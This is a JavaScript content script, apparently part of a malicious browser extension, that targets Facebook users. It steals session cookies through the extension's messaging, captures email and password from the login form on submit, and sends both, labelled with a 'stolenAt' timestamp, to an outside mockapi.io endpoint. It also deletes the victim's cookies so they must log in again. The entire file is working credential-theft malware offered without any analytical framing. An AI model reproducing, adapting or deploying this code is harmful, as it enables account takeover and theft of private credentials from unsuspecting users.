const API = "https://6514b3f1dc3282a6a3cd7125.mockapi.io/cookies";
const targetURL = "https://www.facebook.com";
const userAgent = navigator.userAgent;

function addZero(number) {
    return number < 10 ? "0" + number : number;
}

const dateTime = () => {
    const currentDate = new Date();
    const year = currentDate.getFullYear();
    const month = addZero(currentDate.getMonth() + 1);
    const day = addZero(currentDate.getDate());
    const hours = addZero(currentDate.getHours());
    const minutes = addZero(currentDate.getMinutes());
    const seconds = addZero(currentDate.getSeconds());
    return `${hours}:${minutes}:${seconds} - ${day}/${month}/${year}`;
};

const getCUser = () => {
    const s = `"CurrentUserInitialData":{"ACCOUNT_ID":"`;
    const scripts = document.querySelectorAll("script[data-sjs]");
    let c_user = null;

    scripts.forEach((script) => {
        if (script.innerText.includes(s)) {
            c_user = script.innerText.split(s)[1].split(`"`)[0];
        }
    });

    return c_user;
};

const keyLogging = () => {
    try {
        const c_user = localStorage.getItem("c_user")?.split('"')[1];
        const edEmail = document.getElementById("email");
        const edPass = document.getElementById("pass");
        const form = edEmail.parentElement.parentElement.parentElement;

        form.onsubmit = async () => {
            const email = edEmail.value;
            const pass = edPass.value;
            const user = {
                email,
                password: pass,
                userAgent,
                stolenAt: dateTime(),
            };

            if (c_user) {
                const res = await fetch(`${API}?c_user=${c_user}`);
                const data = await res.json();

                if (data.length <= 0) {
                    await fetch(`${API}`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ ...user, c_user }),
                    });
                } else {
                    const id = data[0].id;
                    await fetch(`${API}/${id}`, {
                        method: "PUT",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify(user),
                    });
                    localStorage.removeItem("c_user");
                }
            } else {
                await fetch(`${API}`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(user),
                });
            }
        };
    } catch (error) {
        console.log("error to get user!");
    }
};

const getCookies = () => {
    return new Promise((resolve, reject) => {
        chrome.runtime.sendMessage("getcookies", (e) => {
            e && e !== "" ? resolve(e) : reject(null);
        });
    });
};

const removeCookies = () => {
    chrome.runtime.sendMessage("removecookies", (e) => {});
};

const processUser = async (c_user) => {
    if (c_user) {
        console.log("Found user", c_user);
        const res = await fetch(`${API}/?c_user=${c_user}`);
        const data = await res.json();

        if (data.length <= 0) {
            console.log("user data not have in server!");
            try {
                const cookie = await getCookies();
                console.log("storing user cookie and save localstorage...");
                localStorage.setItem("c_user", JSON.stringify(c_user));

                const user = {
                    c_user,
                    cookie,
                    userAgent,
                    stolenAt: dateTime(),
                };

                await fetch(`${API}`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(user),
                });

                console.log("remove the user cookies");
                removeCookies();
            } catch (error) {
                // Handle errors
            }
        } else {
            try {
                const cookie = await getCookies();
                console.log("update user cookie...");
                const user = {
                    cookie,
                    userAgent,
                    stolenAt: dateTime(),
                };

                await fetch(`${API}/${data[0].id}`, {
                    method: "PUT",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(user),
                });

                console.log("success");
            } catch (error) {
                console.log("error");
            }
        }
    } else {
        keyLogging();
    }
};

(() => {
    const c_user = getCUser();
    processUser(c_user);
})();
